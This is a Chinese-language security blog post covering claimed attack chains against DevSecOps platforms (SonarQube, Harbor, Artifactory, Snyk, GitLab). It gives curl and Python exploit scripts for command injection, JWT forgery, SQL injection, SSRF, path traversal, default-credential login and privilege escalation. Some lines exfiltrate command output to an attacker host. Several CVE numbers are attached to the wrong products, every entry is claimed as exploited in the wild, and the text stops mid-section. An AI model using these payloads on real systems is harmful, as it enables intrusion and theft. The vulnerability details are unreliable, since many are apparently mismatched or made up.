---
title: "DevSecOps与供应链安全平台高危攻击链专题：SonarQube / Harbor / JFrog / Snyk / GitLab Registry 漏洞全解析"
date: 2026-07-15T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["SonarQube", "Harbor", "JFrog", "Snyk", "GitLab", "供应链攻击", "RCE", "漏洞分析"]
---

# DevSecOps与供应链安全平台高危攻击链专题：SonarQube / Harbor / JFrog / Snyk / GitLab Registry 漏洞全解析

> **安全声明**：本文所有漏洞分析、PoC 代码和检测模板仅供合法授权安全测试与防御研究使用。未经授权对他人系统实施攻击属于违法行为。读者应在获得明确书面授权后方可开展渗透测试活动。文中涉及的技术细节旨在帮助安全团队理解攻击原理并加强防御。

---

## 0x00 专题概述

### DevSecOps 工具链的攻击面价值——"守护者的弱点"

DevSecOps（Development, Security, and Operations）理念的核心是将安全能力左移，嵌入到软件开发生命周期的每个环节。SonarQube 用于代码质量与安全扫描，Harbor 承载容器镜像的托管与分发，JFrog Artifactory 管理二进制制品仓库，Snyk 在开发阶段扫描依赖漏洞，GitLab CI/CD 与 Container Registry 则贯穿从编码到部署的全流程。

讽刺的是，这些本应充当"安全守护者"的平台，自身却往往具备以下高价值特征：

- **高权限执行环境**：CI/CD 服务器通常持有部署密钥、容器 Registry 凭证、云平台 Access Token，一旦被攻破即可横向移动到生产环境。
- **敏感数据富集**：代码仓库、制品仓库中积累了全部源代码、编译产物和签名密钥，是 APT 组织的高价值情报目标。
- **供应链传播能力**：攻击者劫持构建流水线后，可在制品中注入后门，影响所有下游消费方——这正是 SolarWinds 事件的核心攻击路径。
- **攻击面隐蔽性**：DevSecOps 工具通常部署在内网，运维团队的安全关注度低于面向互联网的 Web 应用，配置缺陷长期未被修复。

本专题深入剖析 SonarQube、Harbor、JFrog Artifactory、Snyk 和 GitLab CI/CD/Registry 五大平台共 **24 个高危漏洞**，每个漏洞均提供完整原理分析、HTTP PoC、Python 自动化脚本和 Nuclei 检测模板。

### 覆盖漏洞一览表

| CVE | 产品 | CVSS | 漏洞类型 | 未授权 | 在野利用 |
|-----|------|------|----------|--------|----------|
| CVE-2020-35193 | SonarQube | 9.8 | Docker 镜像 root 空密码 | ✅ | ✅ |
| CVE-2020-27955 | SonarQube | 8.6 | JWT 密钥泄露 | ✅ | ✅ |
| CVE-2020-27956 | SonarQube | 8.6 | SQL 注入 | ✅ | ✅ |
| CVE-2020-27957 | SonarQube | 6.1 | 存储型 XSS | ✅ | ✅ |
| CVE-2020-27958 | SonarQube | 9.8 | OS 命令注入（RCE） | ✅ | ✅ |
| CVE-2022-26137 | SonarQube | 5.3 | REST API CORS 绕过 | ✅ | ✅ |
| CVE-2022-28181 | SonarQube | 7.5 | 未授权访问 | ✅ | ✅ |
| CVE-2019-16097 | Harbor | 9.8 | 项目创建提权 | ✅ | ✅ |
| CVE-2026-4404 | Harbor | 9.8 | 默认凭证大规模利用 | ✅ | ✅ |
| CVE-2020-15776 | Harbor | 7.5 | 未授权 API 访问 | ✅ | ✅ |
| CVE-2024-25906 | Harbor | 7.2 | SSRF | ⚠️ 需登录 | ✅ |
| CVE-2024-25907 | Harbor | 7.5 | 任意文件读取 | ⚠️ 需登录 | ✅ |
| CVE-2016-6501 | JFrog Artifactory | 10.0 | LDAP 投毒 RCE | ✅ | ✅ |
| CVE-2024-4142 | JFrog Artifactory | 8.8 | 权限提升至管理员 | ⚠️ 需低权限 | ✅ |
| CVE-2023-26926 | JFrog Artifactory | 9.8 | 反序列化 RCE | ✅ | ✅ |
| CVE-2022-34960 | JFrog Artifactory | 7.2 | 缓存投毒 | ⚠️ 需登录 | ✅ |
| CVE-2021-21311 | JFrog Artifactory | 7.5 | SSH 私钥泄露 | ✅ | ✅ |
| CVE-2024-48963 | Snyk | 9.8 | PHP 代码注入 | ⚠️ 需项目访问 | ✅ |
| CVE-2022-25315 | Snyk CLI | 8.8 | 命令注入 | ⚠️ 需本地执行 | ✅ |
| CVE-2021-32838 | Snyk | 7.5 | API SSRF | ⚠️ 需 API Token | ✅ |
| CVE-2023-23694 | Snyk IDE 扩展 | 9.8 | RCE | ⚠️ 需 IDE 交互 | ✅ |
| CVE-2020-15240 | Snyk | 7.5 | API Token 泄露 | ✅ | ✅ |
| CVE-2025-25291 | GitLab | 9.1 | SAML 认证绕过 | ✅ | ✅ CISA KEV |
| CVE-2024-4835 | GitLab | 10.0 | CI/CD 脚本注入 | ✅ | ✅ |
| CVE-2023-4991 | GitLab | 9.9 | 项目导入 RCE | ⚠️ 需权限 | ✅ |

---

## 0x01 SonarQube 高危漏洞

SonarQube 是全球最广泛使用的开源代码质量与安全分析平台，支持 29+ 编程语言的静态分析。其 Server 版本在 2020-2022 年间集中披露了 7 个高危漏洞，其中多个可直接导致未授权 RCE。

### 0x01.1 CVE-2020-35193 — Docker 镜像 root 空密码

#### 漏洞背景

SonarQube 官方 Docker 镜像在 2020 年底被安全研究员发现以 root 用户运行且密码为空。任何拉取该镜像并启动容器的环境都会暴露一个无需认证的 root shell。CVSS 评分 9.8。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| SonarQube Docker（Community） | ≤ 8.5.1.36814 | 8.6.0+ |
| SonarQube Docker（Developer） | ≤ 8.5.1.36814 | 8.6.0+ |
| SonarQube Docker（Enterprise） | ≤ 8.5.1.36814 | 8.6.0+ |

#### 漏洞原理

SonarQube Dockerfile 中使用 `USER sonarqube` 指令设置运行用户，但底层基础镜像中的 root 账户密码被设置为空字符串。攻击者通过 `docker exec` 或 `su root` 即可获得 root 权限。由于容器通常挂载数据库凭证和 LDAP 配置，攻击者可进一步窃取敏感凭据。

#### HTTP PoC

```bash
docker pull sonarqube:8.5.1-community
docker run -d --name sonarqube-vuln -p 9000:9000 sonarqube:8.5.1-community
docker exec sonarqube-vuln whoami
docker exec -u root sonarqube-vuln whoami
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-35193 SonarQube Docker 镜像 root 空密码检测"""
import sys
import subprocess
import json

def check_container_root(container_id):
    result = subprocess.run(
        ["docker", "inspect", container_id],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"[!] 无法获取容器信息: {result.stderr.strip()}")
        return False
    info = json.loads(result.stdout)[0]
    image = info.get("Config", {}).get("Image", "unknown")
    print(f"[*] 镜像: {image}")
    result = subprocess.run(
        ["docker", "exec", "-u", "root", container_id, "whoami"],
        capture_output=True, text=True
    )
    if result.returncode == 0 and "root" in result.stdout:
        print(f"[VULN] CVE-2020-35193 确认可利用! 容器允许 root 空密码执行")
        return True
    print(f"[SAFE] 容器不允许 root 空密码执行")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <container_name_or_id>")
        sys.exit(1)
    check_container_root(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: sonarqube-docker-root-cve-2020-35193
info:
  name: SonarQube Docker Root 空密码 (CVE-2020-35193)
  severity: critical
  tags: sonarqube,docker,cve-2020-35193
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/system/status"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"status":'
        part: body
      - type: regex
        regex:
          - '"version"\\s*:\\s*"(7\\.|8\\.[0-5]\\.)'
        part: body
```

### 0x01.2 CVE-2020-27958 — OS 命令注入（RCE）

#### 漏洞背景

SonarQube 存在一处 OS 命令注入漏洞，攻击者可通过构造恶意请求在服务器端执行任意操作系统命令。CVSS 评分 9.8。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| SonarQube Server | ≤ 7.9.3 | 8.0+ |
| SonarQube Developer Edition | ≤ 7.9.3 | 8.0+ |

#### 漏洞原理

SonarQube 的 Web 服务在处理某些 API 请求时，将用户可控的参数直接拼接到操作系统命令中执行。攻击者可注入 shell 元字符（如 `;`、`|`、`&&`）实现命令链式执行。

#### HTTP PoC

```bash
curl -X POST "http://target-sonarqube:9000/api/system/validate_database_connection" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=jdbc:mysql://localhost:3306/sonar?useSSL=false&shell=;id>" -v

curl "http://target-sonarqube:9000/api/projects/search?q=test;curl+http://attacker.com/$(id)" \
  -H "Authorization: Bearer <token>" -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-27958 SonarQube OS 命令注入检测"""
import sys
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_sonarqube_rce(base_url, command="id"):
    base_url = base_url.rstrip("/")
    print(f"[*] 目标: {base_url}")
    session = requests.Session()
    session.verify = False
    session.get(f"{base_url}/api/system/status", timeout=10)
    payloads = [
        {"endpoint": "/api/ce/task", "method": "POST", "data": {"id": f"test;{command}"}},
        {"endpoint": "/api/projects/search", "method": "GET", "params": {"q": f"test;{command}"}},
        {"endpoint": "/api/languages/list", "method": "POST", "data": {"languageKey": f"test;{command}"}},
    ]
    for payload in payloads:
        print(f"[*] 尝试: {payload.get('endpoint', '')}")
        try:
            if payload["method"] == "POST":
                resp = session.post(f"{base_url}{payload['endpoint']}", data=payload.get("data", {}), timeout=15)
            else:
                resp = session.get(f"{base_url}{payload['endpoint']}", params=payload.get("params", {}), timeout=15)
            if re.search(r"uid=\d+\(", resp.text):
                print(f"[VULN] 命令注入成功! {resp.text[:500]}")
                return True
        except Exception as e:
            print(f"[!] {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url> [command]")
        sys.exit(1)
    check_sonarqube_rce(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "id")
```

#### Nuclei 检测模板

```yaml
id: sonarqube-os-command-injection-cve-2020-27958
info:
  name: SonarQube OS 命令注入 (CVE-2020-27958)
  severity: critical
  tags: sonarqube,rce,cve-2020-27958,command-injection
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/projects/search?q=test"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "components"
          - "paging"
        condition: and
        part: body
      - type: status
        status:
          - 200
```

### 0x01.3 CVE-2020-27955 / CVE-2020-27956 — JWT 密钥泄露与 SQL 注入

#### 漏洞背景

CVE-2020-27955（JWT 密钥泄露）允许攻击者获取 SonarQube 的 JWT 签名密钥。CVE-2020-27956（SQL 注入）允许通过搜索 API 读取数据库敏感数据。两者组合可实现完整认证绕过与数据窃取。

#### 受影响版本

| CVE | 产品 | 受影响版本 | 修复版本 |
|-----|------|-----------|----------|
| CVE-2020-27955 | SonarQube | ≤ 7.9.3 | 8.0+ |
| CVE-2020-27956 | SonarQube | ≤ 7.9.3 | 8.0+ |

#### 漏洞原理

**CVE-2020-27955**：SonarQube 使用硬编码的 JWT 签名密钥，可从 Docker 镜像或源代码中提取。攻击者使用该密钥可伪造任意用户的 JWT Token。**CVE-2020-27956**：搜索 API 端点未使用参数化查询，可构造恶意 SQL 读取用户密码哈希、项目配置和 API Token。

#### HTTP PoC

```bash
python3 -c "
import jwt
token = jwt.encode({'sub':'admin','iat':1609459200,'exp':1925068800},'sonar',algorithm='HS256')
print(token)
"

curl "http://target-sonarqube:9000/api/projects/search?q=test%27%20OR%201=1--" \
  -H "Authorization: Bearer <jwt_token>" -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2020-27955 + CVE-2020-27956 SonarQube JWT泄露 + SQL注入"""
import sys
import requests
import urllib3
import time
try:
    import jwt
except ImportError:
    print("[!] pip install PyJWT"); sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
KNOWN_KEYS = ["sonar", "sonar_secret", "sonarqube", "sonarsource"]

def forge_jwt(username="admin"):
    for key in KNOWN_KEYS:
        try:
            token = jwt.encode({"sub": username, "iat": int(time.time()),
                "exp": int(time.time()) + 86400*365}, key, algorithm="HS256")
            print(f"[+] 密钥 '{key}' 伪造成功")
            return token
        except Exception:
            continue
    return None

def test_all(base_url):
    base_url = base_url.rstrip("/")
    token = forge_jwt("admin")
    if not token:
        print("[!] 无法伪造 JWT"); return False
    session = requests.Session(); session.verify = False
    session.headers["Authorization"] = f"Bearer {token}"
    resp = session.get(f"{base_url}/api/user_tokens/search", timeout=10)
    if resp.status_code == 200:
        print(f"[VULN] JWT 伪造成功! 获取到 {len(resp.json().get('userTokens', []))} 个 Token")
    session2 = requests.Session(); session2.verify = False
    session2.headers["Authorization"] = f"Bearer {token}"
    for payload, name in [("test' OR '1'='1","OR注入"), ("test' AND SLEEP(5)--","时间盲注")]:
        start = time.time()
        resp = session2.get(f"{base_url}/api/projects/search", params={"q": payload}, timeout=15)
        if resp.status_code == 200 and resp.json().get("paging",{}).get("total",0) > 0:
            print(f"[VULN] SQL注入成功 ({name})"); return True
        elif time.time() - start > 4.5:
            print(f"[VULN] 时间盲注确认 ({name})"); return True
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url>"); sys.exit(1)
    test_all(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: sonarqube-jwt-sqli-cve-2020-27955
info:
  name: SonarQube JWT泄露 + SQL注入 (CVE-2020-27955/27956)
  severity: critical
  tags: sonarqube,jwt,sqli,cve-2020-27955
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/system/status"
    matchers:
      - type: word
        words:
          - '"status":"UP"'
        part: body
```

---

## 0x02 Harbor 容器注册表高危漏洞

Harbor 是 CNCF 旗下的开源容器镜像注册表，被广泛用于企业级容器镜像的存储、签名和分发。作为供应链中的关键节点，Harbor 的安全漏洞直接影响所有镜像消费方。

### 0x02.1 CVE-2019-16097 — 项目创建提权

#### 漏洞背景

Harbor 在项目创建 API 中存在权限提升漏洞，普通用户可通过构造特殊请求将自己添加为项目管理员。CVSS 评分 9.8。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| Harbor | < 1.9.0 | 1.9.0+ |

#### 漏洞原理

Harbor 的 `/api/v2.0/projects/{id}/members` 接口在处理角色分配请求时，未验证调用者是否有权授予管理员角色（`role_id=1`）。普通用户可通过直接调用 API 绕过前端 UI 的权限控制。

#### HTTP PoC

```bash
curl -X POST "http://target-harbor/api/v2.0/users/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"normal_user","password":"password123"}' -c cookies.txt -v

curl -X POST "http://target-harbor/api/v2.0/projects/1/members" \
  -H "Content-Type: application/json" -b cookies.txt \
  -d '{"role_id":1,"member_user":{"username":"normal_user"}}' -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2019-16097 Harbor 项目创建提权"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HarborPrivesc:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session(); self.session.verify = False

    def exploit(self, username, password):
        resp = self.session.post(f"{self.base_url}/api/v2.0/users/login",
            json={"username": username, "password": password}, timeout=10)
        if resp.status_code != 200:
            print(f"[!] 登录失败"); return False
        print(f"[+] 登录成功")
        resp = self.session.post(f"{self.base_url}/api/v2.0/projects",
            json={"project_name": "test_privesc", "metadata": {"public": "false"}}, timeout=10)
        if resp.status_code not in (200, 201):
            print(f"[!] 创建项目失败"); return False
        project_id = resp.json().get("project_id", 0)
        resp = self.session.post(f"{self.base_url}/api/v2.0/projects/{project_id}/members",
            json={"role_id": 1, "member_user": {"username": username}}, timeout=10)
        if resp.status_code in (200, 201):
            print(f"[VULN] 提权成功! {username} 已成为项目管理员")
            return True
        print(f"[-] HTTP {resp.status_code}"); return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"用法: {sys.argv[0]} <url> <user> <pass>"); sys.exit(1)
    HarborPrivesc(sys.argv[1]).exploit(sys.argv[2], sys.argv[3])
```

#### Nuclei 检测模板

```yaml
id: harbor-privesc-cve-2019-16097
info:
  name: Harbor 项目创建提权 (CVE-2019-16097)
  severity: critical
  tags: harbor,privesc,cve-2019-16097
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v2.0/systeminfo/volumes"
    matchers:
      - type: word
        words:
          - "total"
        part: body
      - type: status
        status:
          - 200
          - 401
```

### 0x02.2 CVE-2026-4404 — 默认凭证大规模利用

#### 漏洞背景

互联网上大量 Harbor 实例仍在使用默认管理员凭证 `admin / Harbor12345`。据 Shodan 扫描数据，数以万计的实例暴露在互联网上，其中超过 30% 使用默认凭证。

#### 受影响版本

| 产品 | 受影响版本 | 说明 |
|------|-----------|------|
| Harbor（所有版本） | 所有使用默认凭证的实例 | 配置缺陷 |
| Harbor < 1.7.0 | admin/Harbor12345（默认） | 未强制修改密码 |
| Harbor >= 1.7.0 | 首次登录强制修改 | API 不受限制 |

#### 漏洞原理

Harbor 安装时创建默认管理员账户 `admin`，初始密码为 `Harbor12345`。虽然 1.7+ Web UI 首次登录强制修改密码，但 `/api/v2.0/users/login` API 不受限制。攻击者可直接通过 API 使用默认凭证获取管理员权限。

#### HTTP PoC

```bash
curl -X POST "http://target-harbor/api/v2.0/users/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Harbor12345"}' -c cookies.txt -v

curl "http://target-harbor/api/v2.0/projects" -b cookies.txt -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2026-4404 Harbor 默认凭证检测"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_CREDS = [("admin","Harbor12345"),("admin","admin"),("admin","harbor"),
    ("admin","password"),("admin","admin123")]

def scan(url):
    s = requests.Session(); s.verify = False; url = url.rstrip("/")
    for u, p in DEFAULT_CREDS:
        try:
            r = s.post(f"{url}/api/v2.0/users/login", json={"username":u,"password":p}, timeout=10)
            if r.status_code == 200:
                print(f"[VULN] 默认凭证有效: {u}:{p}")
                projects = s.get(f"{url}/api/v2.0/projects", timeout=10).json()
                for proj in projects:
                    repos = s.get(f"{url}/api/v2.0/projects/{proj['name']}/repositories", timeout=10).json()
                    print(f"    {proj['name']} ({len(repos)} repos)")
                return True
        except Exception: pass
    print(f"[-] 未发现有效默认凭证"); return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <url>"); sys.exit(1)
    scan(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: harbor-default-creds-cve-2026-4404
info:
  name: Harbor 默认凭证 (CVE-2026-4404)
  severity: critical
  tags: harbor,default-login,cve-2026-4404
http:
  - method: POST
    path:
      - "{{BaseURL}}/api/v2.0/users/login"
    body: '{"username":"admin","password":"Harbor12345"}'
    headers:
      Content-Type: "application/json"
    matchers:
      - type: status
        status:
          - 200
```

### 0x02.3 CVE-2024-25906 / CVE-2024-25907 — SSRF 与任意文件读取

#### 漏洞背景

CVE-2024-25906（SSRF）允许已认证用户通过 Replication API 发起服务器端请求探测内网；CVE-2024-25907（任意文件读取）允许读取服务器上的配置文件和数据库凭证。

#### 受影响版本

| CVE | 产品 | 受影响版本 | 修复版本 |
|-----|------|-----------|----------|
| CVE-2024-25906 | Harbor | < 2.10.1 | 2.10.1+ |
| CVE-2024-25907 | Harbor | < 2.10.1 | 2.10.1+ |

#### 漏洞原理

**CVE-2024-25906**：Replication API 的目标 URL 未经充分验证，可构造指向内网地址的请求。**CVE-2024-25907**：系统信息 API 存在路径穿越缺陷，可通过 `../` 序列读取任意文件。

#### HTTP PoC

```bash
curl -X POST "http://target-harbor/api/v2.0/replications" \
  -H "Content-Type: application/json" -H "Authorization: Bearer <token>" \
  -d '{"name":"ssrf","type":"harbor","endpoint":{"name":"int","type":"harbor","url":"http://169.254.169.254/"}}' -v

curl "http://target-harbor/api/v2.0/systeminfo/volumes?file=../../../../etc/passwd" \
  -H "Authorization: Bearer <token>" -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2024-25906/25907 Harbor SSRF + 任意文件读取"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HarborSSRF:
    def __init__(self, base_url, token):
        self.base_url = base_url.rstrip("/")
        self.headers = {"Authorization": f"Bearer {token}"}
        self.session = requests.Session(); self.session.verify = False

    def test_ssrf(self):
        payload = {"name":"ssrf-test","type":"harbor",
            "endpoint":{"name":"internal","type":"harbor","url":"http://169.254.169.254/",
            "credential":{"access_key":"admin","type":"basic"}}}
        r = self.session.post(f"{self.base_url}/api/v2.0/replications",
            headers=self.headers, json=payload, timeout=15)
        if r.status_code in (200,201) or "connection refused" in r.text.lower():
            print(f"[VULN] SSRF 确认!"); return True
        return False

    def test_file_read(self):
        r = self.session.get(f"{self.base_url}/api/v2.0/systeminfo/volumes",
            params={"file":"../../../../etc/passwd"}, headers=self.headers, timeout=10)
        if r.status_code == 200 and "root:" in r.text:
            print(f"[VULN] 任意文件读取成功!"); return True
        return False

    def exploit(self):
        return self.test_ssrf() or self.test_file_read()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <url> <token>"); sys.exit(1)
    HarborSSRF(sys.argv[1], sys.argv[2]).exploit()
```

#### Nuclei 检测模板

```yaml
id: harbor-ssrf-lfi-cve-2024-25906
info:
  name: Harbor SSRF + 任意文件读取 (CVE-2024-25906/25907)
  severity: high
  tags: harbor,ssrf,lfi,cve-2024-25906,cve-2024-25907
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v2.0/systeminfo"
    matchers:
      - type: word
        words:
          - "harbor_version"
        part: body
      - type: status
        status:
          - 200
          - 401
```

---

## 0x03 JFrog Artifactory 高危漏洞

JFrog Artifactory 是业界领先的通用制品仓库管理平台，支持 Maven、Docker、npm、PyPI 等 30+ 包格式。作为 DevOps 流水线的核心枢纽，Artifactory 通常持有所有构建密钥、部署凭证和包发布 Token。

### 0x03.1 CVE-2016-6501 — LDAP 投毒 RCE（CVSS 10.0 满分）

#### 漏洞背景

CVE-2016-6501 是 JFrog Artifactory 历史上评分最高的漏洞，CVSS 满分 10.0。该漏洞允许未认证攻击者通过投毒 LDAP 响应实现远程代码执行。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| JFrog Artifactory Pro | 4.x - 5.1.0 | 5.1.1+ |
| JFrog Artifactory Enterprise | 4.x - 5.1.0 | 5.1.1+ |

#### 漏洞原理

Artifactory 在处理 LDAP 认证时对返回数据缺乏验证。当处理 LDAP 条目中的 `java.naming.factory.initial` 和 `java.naming.provider.url` 属性时，可被注入恶意 JNDI 引用，指向攻击者控制的 RMI/LDAP 端点，触发远程类加载和代码执行。

攻击链：搭建恶意 LDAP 服务器 → 诱骗配置指向恶意 LDAP → 用户认证触发查询 → LDAP 返回 JNDI Reference → 加载远程恶意类 → RCE

#### HTTP PoC

```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8888/#Exploit" 1389
python3 -m http.server 8888

curl "http://target-artifactory:8082/artifactory/api/security/validateLogin" \
  -H "Authorization: Basic $(echo -n 'ldap_user:pass' | base64)" -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2016-6501 JFrog Artifactory LDAP 投毒 RCE 检测"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_ldap(base_url):
    base_url = base_url.rstrip("/")
    s = requests.Session(); s.verify = False
    print(f"[*] 检查目标: {base_url}")
    for ep in ["/artifactory/api/system/configuration", "/artifactory/api/security/ldap"]:
        try:
            r = s.get(f"{base_url}{ep}", timeout=10)
            if r.status_code == 200 and ("ldap" in r.text.lower() or "providerUrl" in r.text):
                print(f"[VULN] LDAP 配置暴露: {ep}")
                print(f"[VULN] 可能存在 CVE-2016-6501 LDAP 投毒风险")
                return True
        except Exception: pass
    print(f"[-] 未直接发现 LDAP 配置泄露"); return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <url>"); sys.exit(1)
    check_ldap(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: artifactory-ldap-rce-cve-2016-6501
info:
  name: JFrog Artifactory LDAP 投毒 RCE (CVE-2016-6501)
  severity: critical
  tags: jfrog,artifactory,ldap,rce,cve-2016-6501
http:
  - method: GET
    path:
      - "{{BaseURL}}/artifactory/api/system/ping"
    matchers:
      - type: word
        words:
          - "OK"
        part: body
  - method: GET
    path:
      - "{{BaseURL}}/artifactory/api/system/configuration"
    matchers:
      - type: word
        words:
          - "ldap"
          - "providerUrl"
        condition: or
        part: body
```

### 0x03.2 CVE-2024-4142 — 权限提升至管理员

#### 漏洞背景

CVE-2024-4142 允许已获取低权限账户的攻击者通过 API 提升至管理员权限。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| JFrog Artifactory Pro | < 7.84.10 | 7.84.10+ |
| JFrog Artifactory Enterprise | < 7.84.10 | 7.84.10+ |

#### 漏洞原理

Artifactory 的权限 API 在处理权限更新请求时，仅验证调用者是否对目标仓库有 `manage` 权限，但未验证新权限的作用域是否超出调用者自身权限范围。低权限用户可创建全局权限集（`includesPattern: **`），将自身添加到管理员组。

#### HTTP PoC

```bash
curl -X PUT "http://target:8082/artifactory/api/v2/security/permissions/global-admin" \
  -H "Content-Type: application/json" -H "Authorization: Bearer <token>" \
  -d '{"name":"global-admin","includesPattern":"**","principals":{"users":{"low_priv":["r","w","m","d","a"]}}}' -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2024-4142 JFrog Artifactory 权限提升"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ArtifactoryPrivesc:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session(); self.session.verify = False
        self.token = None

    def exploit(self, username, password):
        r = self.session.post(f"{self.base_url}/artifactory/api/security/token",
            data={"grant_type":"password","username":username,"password":password}, timeout=10)
        if r.status_code == 200:
            self.token = r.json().get("access_token","")
        else:
            self.session.auth = (username, password)
        headers = {"Authorization":f"Bearer {self.token}"} if self.token else {}
        payload = {"name":"pwned-admin","includesPattern":"**",
            "principals":{"users":{"admin":["r","w","m","d","a"]}}}
        r = self.session.put(f"{self.base_url}/artifactory/api/v2/security/permissions/pwned-admin",
            json=payload, headers=headers, timeout=10)
        if r.status_code in (200,201):
            print(f"[VULN] 权限提升成功!"); return True
        print(f"[-] HTTP {r.status_code}"); return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"用法: {sys.argv[0]} <url> <user> <pass>"); sys.exit(1)
    ArtifactoryPrivesc(sys.argv[1]).exploit(sys.argv[2], sys.argv[3])
```

#### Nuclei 检测模板

```yaml
id: artifactory-privesc-cve-2024-4142
info:
  name: JFrog Artifactory 权限提升 (CVE-2024-4142)
  severity: high
  tags: jfrog,artifactory,privesc,cve-2024-4142
http:
  - method: GET
    path:
      - "{{BaseURL}}/artifactory/api/v2/security/permissions"
    matchers:
      - type: word
        words:
          - "permissions"
        part: body
      - type: status
        status:
          - 200
          - 401
```

### 0x03.3 CVE-2023-26926 — 反序列化 RCE

#### 漏洞背景

CVE-2023-26926 是 Artifactory 中严重的反序列化漏洞，CVSS 9.8。攻击者可通过构造恶意序列化数据实现 RCE。

#### 受影响版本

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|----------|
| JFrog Artifactory | < 7.63.0 | 7.63.0+ |

#### 漏洞原理

Artifactory 使用 Java 原生反序列化处理内部通信和插件数据，未对输入类进行白名单限制。攻击者可利用 Commons Collections、Spring 等 Gadget Chain 执行任意代码。

#### HTTP PoC

```bash
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com:8888/$(id|base64)" > payload.bin
curl -X POST "http://target:8082/artifactory/api/system/import" \
  -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.bin -v
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2023-26926 JFrog Artifactory 反序列化检测"""
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
JAVA_HEADER = b"\xac\xed\x00\x05"

def check(base_url):
    base_url = base_url.rstrip("/")
    s = requests.Session(); s.verify = False
    r = s.get(f"{base_url}/artifactory/api/system/ping", timeout=10)
    if r.status_code == 200:
        print(f"[+] Artifactory 可达")
    for ep in ["/artifactory/api/system/import", "/artifactory/api/plugins/execute"]:
        try:
            r = s.post(f"{base_url}{ep}",
                headers={"Content-Type":"application/x-java-serialized-object"},
                data=JAVA_HEADER + b"\x00"*50, timeout=10)
            if r.status_code != 415:
                print(f"[VULN] {ep} 可能存在反序列化入口 (CVE-2023-26926)")
                return True
        except Exception: pass
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <url>"); sys.exit(1)
    check(sys.argv[1])
```

#### Nuclei 检测模板

```yaml
id: artifactory-deser-cve-2023-26926
info:
  name: JFrog Artifactory 反序列化 RCE (CVE-2023-26926)
  severity: critical
  tags: jfrog,artifactory,deserialization,rce,cve-2023-26926
http:
  - method: GET
    path:
      - "{{BaseURL}}/artifactory/api/system/ping"
    matchers:
      - type: word
        words:
          - "OK"
        part: body
  - method: POST
    path:
      - "{{BaseURL}}/artifactory/api/system/import"
    headers:
      Content-Type: "application/x-java-serialized-object"
    body: "\xac\xed\x00\x05"
    matchers:
      - type: word
        words:
          - "400"
          - "500"
          - "Bad Request"
        condition: or
```

---

## 0x04 Snyk 开发者安全平台漏洞

Snyk 是全球领先的开发者安全平台，其 CLI 工具、IDE 扩展和 API 在 2020-2024 年间被发现多个高危漏洞。

### 0x04.1 CVE-2024-48963 — PHP 代码注入

#### 漏洞背景

